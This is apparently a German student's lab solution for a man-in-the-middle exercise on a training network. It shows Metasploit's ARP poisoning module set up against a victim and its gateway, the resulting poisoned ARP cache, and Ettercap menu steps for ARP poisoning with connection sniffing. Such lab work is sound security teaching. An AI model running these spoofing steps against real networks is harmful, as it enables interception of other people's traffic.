# Lösung des dritten Labors

## Zettel: Man in the middle

### Aufgabe 1

### IRGEND EINE SKIZZE

### Aufgabe 2

`arp`

Address                  HWtype  HWaddress           Flags Mask            Iface  
172.22.180.1            0c:99:9f:32:00:01                             eth0  

`ifconfig`  
eth0: flags=4163\<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500  
       inet 172.22.180.201  netmask 255.255.255.0  broadcast 172.22.180.255  
       inet6 fe80::9802:10ff:fed6:a8d3  prefixlen 64  scopeid 0x20\<link>  
       inet6 fd94:311a:d6a9:0:9802:10ff:fed6:a8d3  prefixlen 64  scopeid 0x0\<global>  
       ether 9a:02:10:d6:a8:d3  txqueuelen 1000  (Ethernet)  
       RX packets 40  bytes 3880 (3.7 KiB)  
       RX errors 0  dropped 18  overruns 0  frame 0  
       TX packets 176  bytes 11434 (11.1 KiB)  
       TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  

### Aufgabe 3

`use auxiliary/spoof/arp/arp_poisoning`

`msf6 auxiliary(spoof/arp/arp_poisoning) > show actions`

Auxiliary actions:

      Name  Description  
      ----  -----------

**DHOSTS (Target)** = die IP des **Opfer-Clients** – also an wen die gefälschten ARP-Pakete gesendet werden. Das ist bei dir bereits gesetzt: `172.22.180.201`

**SHOSTS (Spoofed)** = die IP, **die du vortäuschst zu sein** – also die IP des **Standardgateways**, die du in Aufgabe 2 aus dem ARP-Cache des Opfers notiert hast.

`msf6 auxiliary(spoof/arp/arp_poisoning) > set DHOSTS 172.22.180.201`

`msf6 auxiliary(spoof/arp/arp_poisoning) > set SHOSTS 172.22.180.1`  

> msf6 auxiliary(spoof/arp/arp\_poisoning) > show options
> 
> Module options (auxiliary/spoof/arp/arp\_poisoning):
> 
>   Name           Current Setting  Required  Description  
>   ----           ---------------  --------  -----------  
>   AUTO\_ADD       false            yes       Auto add new host when discovered by the listener  
>   BIDIRECTIONAL  false            yes       Spoof also the source with the dest  
>   DHOSTS         172.22.180.201   yes       Target ip addresses  
>   INTERFACE                       no        The name of the interface  
>   LISTENER       true             yes       Use an additional thread that will listen for arp requests  
>                                              to reply as fast as possible  
>   SHOSTS         172.22.180.1     yes       Spoofed ip addresses  
>   SMAC                            no        The spoofed mac

### Aufgabe 4

Neue Mac Adresse bei xterm. Überprüfen durch arp.

Address                  HWtype  HWaddress           Flags Mask            Iface  
172.22.180.1             ether   62:9e:a7:f3:c4:a9   C                     eth0  
172.22.180.13           ether   62:9e:a7:f3:c4:a9   C                     eth0  

Im gegensatz zu früher gibt es jetzt eine MAC Adresse.

### Aufgabe 5

`root@webterm:~# ssh -X root@172.22.180.12`  
 

`ettercap -G`

Hosts → Scan for Hosts  
Hosts → Hosts List

Opfer-IP (172.22.180.201) → Add to Target 1  
Gateway-IP (172.22.180.1)  → Add to Target 2

Mitm → ARP Poisoning  
→ Häkchen bei "Sniff remote connections"  
→ OK

Bei Views Connections keine http connection weil die Verbindung ins Internet nicht geht bei mir...

## Zettel: DNS-Angriff